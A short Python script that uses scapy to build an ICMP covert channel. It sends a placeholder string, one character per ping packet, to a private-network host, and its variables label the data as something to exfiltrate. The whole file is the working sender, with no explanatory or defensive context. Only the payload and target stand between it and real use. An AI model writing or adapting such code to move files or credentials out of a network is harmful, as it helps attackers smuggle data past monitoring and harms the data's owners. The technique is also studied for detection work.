
from scapy.all import *

target_ip = "192.168.1.10"
data_to_exfiltrate = "Covert Channel Using ICMP"

def icmp_tunnel():
    for char in data_to_exfiltrate:
        pkt = IP(dst=target_ip) / ICMP() / char
        send(pkt, verbose=False)

if __name__ == "__main__":
    icmp_tunnel()
